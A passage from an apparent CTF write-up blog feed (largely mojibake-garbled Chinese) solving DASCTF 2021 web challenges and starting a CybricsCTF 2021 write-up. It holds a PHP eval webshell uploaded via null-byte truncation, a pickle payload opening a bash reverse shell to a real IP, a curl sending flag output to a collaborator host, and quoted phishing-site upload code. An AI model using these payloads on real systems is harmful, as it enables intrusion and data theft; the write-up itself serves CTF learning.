&lt;p>&lt;del>üòÖËöåÂü†‰Ωè‰∫Ü&lt;/del>&lt;/p>
&lt;p>ÂõûËøáÂ§¥Êù•Áúã‰∏Ä‰∏ãBurpÂØπÂàöÊâçÊìç‰ΩúÁöÑÊäìÂåÖÁªìÊûúÔºå‰ªécookieÂèØ‰ª•Áü•ÈÅìÂêéÁ´ØÊòØflaskÊ°ÜÊû∂ ÔºåflaskÁöÑËØù‰∏ÄËà¨Ê†áÈÖçsqliteÊï∞ÊçÆÂ∫ìÔºåÁÑ∂ÂêéÁúã‰∏ãÈ°µÈù¢Ê∫êÁ†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805142343684.png" alt="image-20210805142343684">&lt;/p>
&lt;p>Ê≥®ÂÜåÊó∂Áî®postÊèê‰∫§‰ø°ÊÅØÔºåÂØÜÁ†ÅÈÉ®ÂàÜÁî®ÁöÑÊòØ&lt;code>md5(app.users.password+'CBCTF')&lt;/code>ÔºåÊîØ‰ªòÂØÜÁ†ÅÊòØ&lt;code>encrsa(app.users.pay_password)&lt;/code>ÔºåÂ•ΩÂÆ∂‰ºô Ëøô‰∏™Âä†ÂØÜ pay_passwordÈÉ®ÂàÜmd5+rsa+b64&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÊØîËµõÁöÑÊó∂ÂÄôÂü∫Êú¨Â∞±ÂÅúÂà∞ËøôÈáå‰∫ÜÔºåÊÑüËßâÊòØsqli ‰ΩÜÊòØ‰∏çÁü•ÈÅìÊÄé‰πàÊ≥® ÂÖ®ÊòØmd5ÁöÑÔºå‰ª•‰∏ãÊòØÂèÇËÄÉ&lt;a href="https://www.cnblogs.com/erR0Ratao/p/15088223.html">wp&lt;/a>‰πãÂêéÁöÑÂ§çÁé∞&lt;/p>
&lt;p>ËµõÂêéËÆ≤È¢òÁöÑÊó∂ÂÄô Âá∫È¢òÂ∏àÂÇÖËØ¥ÂèÇËÄÉÁöÑÊòØËøô‰∏ÄÁØáÊñáÁ´†&lt;a href="http://cache.baiducontent.com/c?m=DKJpowjfS-VrxBDrvlkdWFgbk_gnjyP0HEBWJljdQEQ9V3LlYgD1_bfav9DjmFclDejSpHzx5A9kyWFfTVUYm0bX6pNmtyBsxwPjYx-C3KRb_L2YzCoKogiCFXWcyV80EQ5dcXMLFlkbGHr_-te4xQbrgVm2Sd2UKx-_aXSrxQZ-IEBexIZkQCHg53QbTNdTQkH1IHgj_ozoB9uq12JYdR54wSPrMDwCK9QMq-qhRNa&amp;amp;p=8734d15e8cd012a05abd9b7d0c1093&amp;amp;newp=8478c915d9c040a911a2c7710f0588231610db2151d6d1126b82c825d7331b001c3bbfb423291b07d6c27a6c01aa485ae9f23073330923a3dda5c91d9fb4c57479c168&amp;amp;s=cfcd208495d565ef&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=%CA%FD%BE%DD%BC%D3%C3%DC%BB%F2%B3%C9WAF%CA%A7%D0%A7%D7%EE%B4%F3%D4%AA%D0%D7&amp;amp;qid=e0c153e70004188f&amp;amp;p1=1">Êï∞ÊçÆÂä†ÂØÜÊàñÊàêWAFÂ§±ÊïàÊúÄÂ§ßÂÖÉÂá∂‚Ä¶&lt;/a>ÔºàÂéüÂ∏ñË¢´404‰∫Ü Âè™Êúâ‰∏™Âø´ÁÖß ËøòÊòØÁôæÂ∫¶Âø´ÁÖßÊâçËÉΩÁúã ËÄå‰∏îÊ≤°ÂõæÔºâÊ†∏ÂøÉÊòØËøô‰∏ÄÊÆµ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805151726564.png" alt="image-20210805151726564">&lt;/p>
&lt;p>Ëøô‰∏™È¢òÁöÑflagË¥≠‰π∞Â∞èÁ´ôÔºåÂØπpay_passwordÊòØËøõË°åÂâçÁ´Ømd5+rsa+b64Âä†ÂØÜÔºåÂêéÁ´ØÂÜçÂØπÂ∫îÁùÄÊãøÁßÅÈí•Ëß£ÂØÜÔºåÂ≠òÂÖ•Êï∞ÊçÆÂ∫ìÁöÑÊòØmd5ÂÄºÔºåÁúã‰ººÂæàÂÆåÁæé ‰ΩÜÊòØÂÖ∂ÂÆûÊ†πÊú¨Ê≤°ÊúâwafÁöÑ‰ªãÂÖ• Ê≤°ÊúâÂØπÂèÇÊï∞ËøõË°å‰ªª‰ΩïËøáÊª§ÔºåÂ¶ÇÊûúÊàë‰ª¨‰ªé‰∏≠Èó¥‰ªãÂÖ• Âè™‰øùÁïôrsa+b64ÁöÑÈÉ®ÂàÜ Â∞±ÂèØ‰ª•‰ªªÊÑèÊéßÂà∂ÂèÇÊï∞ËææÂà∞‰∫åÊ¨°Ê≥®ÂÖ•ÁöÑÊïàÊûú&lt;/p>
&lt;p>ÂÖ¨Èí•Âú®ÁΩëÈ°µÊ∫êÁ†Å‰∏≠Â∑≤ÁªèÁªôÂá∫ÔºåÊï∞ÊçÆË°®ÁöÑÁªìÊûú‰πüÂ∑≤ÁªèÂú®Hint‰∏≠‰∫ÜÔºåÁî®cyberchef‰∏ÄÊääÊ¢≠&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805153732476.png" alt="image-20210805153732476">&lt;/p>
&lt;p>ÈáçÊñ∞Ê≥®ÂÜå‰∏™Ë¥¶Âè∑ÔºåÂè™‰øÆÊîπ‰∏Ä‰∏ãusernameÂç≥ÂèØ passwd‰∏çÁî®Âèò Â∞Üpay_password‰øÆÊîπ‰∏∫‰∏äÈù¢ÁîüÊàêÁöÑÂÄºÔºåÁôªÈôÜÂêéÂç≥ÂèØÁúãÂà∞flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805152706585.png" alt="image-20210805152706585">&lt;/p>
&lt;h2 id="jjs-camera">jj&amp;rsquo;s camera&lt;/h2>
&lt;blockquote>
&lt;p>jjÂú®ÊüêÊ¨°ÁΩëÁªúÂÆâÂÖ®Ê¥ªÂä®‰∏≠ÂèëÁé∞‰∫Ü‰∏™ÈªëÂÆ¢ÂÅöÁöÑÁΩëÁ´ôÔºåËØ∑‰ΩøÁî®httpsËÆøÈóÆÁ´ôÁÇπ&lt;/p>
&lt;p>Hint: ÁΩë‰∏äËÉΩÊêúÂà∞Ê∫êÁ†ÅÔºå‰ªÖ‰øÆÊîπ‰∫ÜÂâçÁ´ØuiÔºåÊ≥®ÊÑèÊúçÂä°Âô®ÁöÑÂìçÂ∫î&lt;/p>
&lt;/blockquote>
&lt;p>‰πüÊòØÂ∑≤ÊúâÁöÑ‰∏úË•ø ‰ΩÜÊòØÊØîËµõÁöÑÊó∂ÂÄôÊàëÊ≤°ÊêúÂà∞Ê∫êÁ†ÅÔºàÂ∞¥Â∞¨ÔºâÊ∫êÁ†ÅÂú®ËøôÈáåÔºö&lt;a href="https://www.heibai.org/post/2002.html">Âú®ÂêóÂÆùË¥ùÔºü‰Ω†ÁÇπÂºÄËøô‰∏™ÁΩëÂùÄÁúãÁúã[ÊâìÂºÄÁΩëÁ´ôÂÅ∑ÊãçÁÖßÁâá]&lt;/a> | &lt;a href="https://www.heibai.org/post/1630.html">ÁÇπÂºÄ‰∏Ä‰∏™ÁΩëÂùÄÊàëË¢´ËÆ∞ÂΩï‰∫ÜipËøòÂÅ∑Êãç‰∫ÜÁÖßÁâá&lt;/a>&lt;/p>
&lt;p>ÔºàÊàëËøô‰∏™Êô∫ÂïÜÁúüÁöÑÊòØË¥üÊï∞Ëµ∑Ê≠•ÁöÑ ‰∏äÈù¢Ëøô‰∏§‰∏™Â∏ñÂ≠êÊàëÁúã‰∫ÜÂ•Ω‰πÖ ÊâçÂèçÂ∫îËøáÊù•Ëøô‰∏™ÈíìÈ±ºÁΩëÁ´ôÊòØË¶ÅÂπ≤Âï•„ÄÇ„ÄÇ„ÄÇ„ÄÇ&lt;/p>
&lt;p>ÂâçÁ´ØÊòØ‰∏Ä‰∏™ÈìæÊé•ÁîüÊàêÁ´ô ‰∏≠Èó¥ÂèØ‰ª•Âä†‰∏Ä‰∏™idÁöÑÂèÇÊï∞ÔºåËÆøÈóÆÂêé‰ºöËá™Âä®Ë∞ÉÁî®ÊëÑÂÉèÂ§¥Ôºà‰ΩÜÊòØ‰ºöÊúâ‰∏™ÊèêÁ§∫ÁöÑÂºπÁ™óÔºâÔºåÂÖàÊãçÁÖßÂÜçÁõ∏Â∫îÈìæÊé•Ôºå‰πãÂêéÂèØ‰ª•Âà∞ÂÖàÂâçÁöÑÈ°µÈù¢Êü•ÁúãÊãçÂà∞ÁöÑÁÖßÁâáÔºåÊï∞ÊçÆ‰ª•postÁöÑÂΩ¢Âºè‰∏ä‰º†Ëá≥/qbl.php?id=xxx&amp;amp;url=xxxÔºåËøôÊòØqbl.phpÁöÑÊ∫êÁ†Å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$base64_img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;img&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$up_dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;./img/&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//Â≠òÊîæÂú®ÂΩìÂâçÁõÆÂΩïÁöÑimgÊñá‰ª∂Â§π‰∏ã
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0777&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^(data:\s*image\/(\w+);base64,)/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#111">$type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;bmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;png&amp;#39;&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#111">$new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;_&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">date&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;mdHis_&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$new_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>file_put_contents()ÊâßË°åÊñá‰ª∂ÂÜôÂÖ•ÔºåÂÜÖÂÆπÂèØÊéß+Ë∑ØÂæÑÂ∑≤Áü•ÔºåËøáÊª§ÁöÑÁÇπÂú®‰∫éÂêéÁºÄÂêçÊòØbmpÊàñpng Âπ∂‰∏îÂè™ÊúâÈô§ÂéªÂêéÁºÄÁöÑËøôÊñá‰ª∂ÂêçÂèØÊéßÔºåphpÁâàÊú¨ÊòØ5.2.17ÔºåÁî®00Êà™Êñ≠ÁªïËøáÔºàpostÈÉ®ÂàÜË¶Åurlencode‰∏Ä‰∏ã burpÊàñËÄÖhackbarÂ∞±Áõ¥Êé•ËΩ¨‰∫Ü&lt;/p>
&lt;pre tabindex="0">&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
&lt;/code>&lt;/pre>&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/">wp&lt;/a>&lt;/p>
&lt;h2 id="easyweb">easyweb&lt;/h2>
&lt;p>Êúâ‰∏Ä‰∏™dockerÁöÑÈôÑ‰ª∂Âíå‰∏Ä‰∫õÊ∫êÁ†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160437216.png" alt="image-20210805160437216">&lt;/p>
&lt;p>È¶ñÈ°µÂ∞±ÊòØ‰∏™ÁôΩÂ∫ïÈªëÂ≠óÁöÑHello WorldÔºåÂÆ°‰∏ãÊ∫êÁ†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160540313.png" alt="image-20210805160540313">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160627110.png" alt="image-20210805160627110">&lt;/p>
&lt;p>Áõ¥Êé•ÊâìÊñ≠ÁÇπË∞ÉËØï‰∏Ä‰∏ãÔºàÂõ†‰∏∫ËøôÈáåÊ∂âÂèäÂà∞sessionÁöÑË∞ÉÁî® ÊâÄ‰ª•Âú®.vscode‰∏≠ÁöÑlaunch.jsonÂ§ÑÊ∑ªÂä†‰∏Ä‰∏™configuration: &lt;code>&amp;quot;justMyCode&amp;quot;: false&lt;/code>ËøôÊ†∑ÂèØ‰ª•Âú®Ë∞ÉÁî®Â†ÜÊ†àÂ§ÑÁúãÂà∞ÂÆåÊï¥ÁöÑË∞ÉÁî®ÊÉÖÂÜµ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805180835775.png" alt="image-20210805180835775">&lt;/p>
&lt;p>ÂèØ‰ª•Ê≥®ÊÑèÂà∞ÊØèÊ¨°Âà∑Êñ∞‰πãÂêé sessionÁöÑÂÄºÈÉΩ‰ºöÂèëÁîüÂèòÂåñÔºåË∞ÉËØïÁöÑÊó∂ÂÄôÂèØ‰ª•ÁúãÂà∞ÁîüÊàêËøô‰∏™sessionÊó∂Ë∞ÉÁî®‰∫ÜdumpsÊñπÊ≥ïÔºåÊâÄ‰ª•Ëøô‰∏™È¢òÂ∞±ÊòØÂèçÂ∫èÂàóÂåñÁöÑÂ•óË∑ØÂï¶&lt;/p>
&lt;p>payloadÊúâ‰∏§ÁßçÂêß ÂèçÂºπshell ÊàñËÄÖÊûÑÈÄ†post/getËØ∑Ê±ÇÂà∞Ëá™Â∑±ÂèØ‰ª•Êé•Êî∂Âà∞ÁöÑÂπ≥Âè∞‰∏äÔºå‰πüÈÉΩÊòØÂ∏∏ËßÑÂÅöÊ≥ï&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/175.24.73.30/2333 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">,))&lt;/span> &lt;span style="color:#75715e">#reduceÂøÖÈ°ªËøîÂõûÂÖÉÁªÑÊàñÂ≠óÁ¨¶‰∏≤&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">hello_world&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;233&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;2333&amp;#34;&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Hello World!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊûÑÈÄ†ËØ∑Ê±ÇÁöÑËØùËøòÊòØËÄÅÊúãÂèã~~ burp collaborator~~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl &lt;span style="color:#d88200">&amp;#34;xxxxxx.burpcollaborator.net/`readflag`&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂèÇËÄÉÔºö&lt;a href="http://www.snowywar.top/wp-content/uploads/2021/08/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%A4%A9%E5%9B%A2WriteUP.pdf">wp&lt;/a>&lt;/p>
&lt;h2 id="easyjava">easyjava&lt;/h2>
&lt;p>java Ê†πÊú¨‰∏ç‰ºö&lt;/p>
&lt;p>Êîæ‰∏™ÂèÇËÄÉÈìæÊé• Ê∫ú‰∫ÜÔºö&lt;a href="https://blog.csdn.net/solitudi/article/details/119322658?spm=1001.2014.3001.5501">wp1&lt;/a> &lt;a href="https://ha1c9on.top/2021/08/02/dasctf-2021-07/">wp2&lt;/a>&lt;/p>
&lt;hr>
&lt;p>ÊúÄËøëÂú®ÊÄªÁªìÂèçÂ∫èÂàóÂåñÊúâÂÖ≥ÁöÑ‰∏úË•øÔºåÊÉ≥Êääphp, python, javaÁöÑÂèçÂ∫èÂàóÂåñ ÂÅöËøáÁöÑ‰∏úË•øÊÄªÁªìÊÄªÁªìÔºå‰ΩÜËøòÊòØÊàëÊÉ≥ÂæóÂ§™ÁÆÄÂçï‰∫Ü ‰∏Ä‰∏™phpÁöÑÂèçÂ∫èÂàóÂåñÂ∞±ÊúâÂ•ΩÂ§öÂ•ΩÂ§ö‰∏úË•øÔºàË£ÖÊ≠ªÔºâ&lt;/p>
&lt;p>‰∫âÂèñÊó©Êî∂Â∑•ÂêßÔºåËøòÊúâupload, xss, csrf, sqli&amp;hellip;&amp;hellip;Á≠âÁùÄÊÄªÁªì ËøòÊúâË∂ÖÁ∫ßÂ§ö‰∏úË•øË¶ÅÂ≠¶Ë¶ÅÁúã&lt;/p>
&lt;p>Â≠¶‰π†Â•ΩËÄ∂ÔºÅœÉ`‚àÄ¬¥)&lt;/p></description></item><item><title>CybricsCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</link><pubDate>Thu, 29 Jul 2021 17:02:12 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</guid><description>&lt;h2 id="mic-check-cyber-baby-50-pts">Mic Check (Cyber, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Those organizers are changing &lt;a href="https://cybrics.net/rules">game rules&lt;/a> all the time! There‚Äôs a flag there, and it‚Äôs not that easy to capture.&lt;/p>
&lt;p>&lt;strong>Also be sure to join &lt;a href="https://t.me/cybrics">@cybrics Telegram chat&lt;/a>&lt;/strong> for challenge-related announcements and contacting orgs in case all goes wrong&lt;/p>
&lt;p>&lt;strong>Added at 10:10 ‚Äî&lt;/strong> looks like the little mic check trolling caused massive pain, I‚Äôve untrolled the rules page :-) You can now copy-paste freely&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png" alt="image-20210724194428638">&lt;/p>
&lt;h2 id="scanner-rebyc-baby-50-pts">Scanner (rebyC, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Mikhail Driagunov (&lt;a href="https://t.me/aethereternity">@aethereternity&lt;/a>)&lt;/p>
&lt;p>Check out this cool new &lt;a href="https://scanner-cybrics2021.ctf.su/">&lt;strong>game&lt;/strong>&lt;/a>!&lt;/p>
&lt;p>I heard they serve flags at level 5.&lt;/p>
&lt;/blockquote>
&lt;p>‰∏çÈöæÔºåÂ∞±ÊòØÊØîËæÉÈ∏°Ë¥º ÊääÂ•ΩÂ•ΩÁöÑÂõæÁâáÂºÑÊàêÁäπÊä±ÁêµÁê∂ÂçäÈÅÆÈù¢&lt;/p>
&lt;p>È¶ñÂÖàÁî®&lt;a href="https://gifsuper.com/">Gif Super&lt;/a>ÊääÂ∏ßÈó¥ÈöîË∞É‰∏∫300msÔºåÁÑ∂ÂêéË£ÅÂâ™Âá∫‰∏≠Èó¥ÊúâÁî®ÁöÑÈÉ®ÂàÜ ÊîæÂÖ•&lt;a href="http://www.atoolbox.net/Tool.php?Id=979">GIFÂä®ÊÄÅÂõæÁâáÂàÜËß£&lt;/a>‰∏≠ÁúãÁªìÊûú ÈÉΩÊúâÂú®Á∫øÂ∑•ÂÖ∑Â∞±ÂæàÊñπ‰æø&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png" alt="image-20210724202614568">&lt;/p>
&lt;p>ÊâÄ‰ª•Ëøô‰∏™Á†¥Áé©ÊÑèÂà∞Â∫ïÊòØÂï•ÔºüÁå™ÔºüËøòÊòØÂà∫Áå¨Ôºü
Âà´ÁöÑÈÉΩËøòÁÆóÊ≠£Â∏∏Âêß Â∞±ÊòØÈÉΩ‰∏çÂ§™ÂÉèÂÖ∂ÂÆû Êúâstar, goose, flag, flower, ring, house, bone&amp;hellip;. ÊúÄÂêé‰∏Ä‰∏™ÊòØ‰∫åÁª¥Á†Å ÊØîËæÉÈ∫ªÁÉ¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png" alt="image-20210724203314255">&lt;/p>
&lt;p>ÂÜçÁ®çÂæÆË∞ÉÊï¥‰∏Ä‰∏ãÂ∞∫ÂØ∏ÔºåÊâ´ÊèèÂ∞±Ë°å‰∫Ü&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png" alt="image-20210724203713402">&lt;/p>
&lt;h2 id="rm--rfer-ctb-baby-166-pts">rm -rf‚Äôer (CTB, Baby, 166 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all that‚Äôs left is one shell session.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh rmrfer@178.154.210.26
Password: sa7Neiyi
&lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
&lt;p>&lt;strong>Added at 13:45 ‚Äî&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If you‚Äôre not seeing the flag, try to find another method that will not hide info from you&lt;/p>
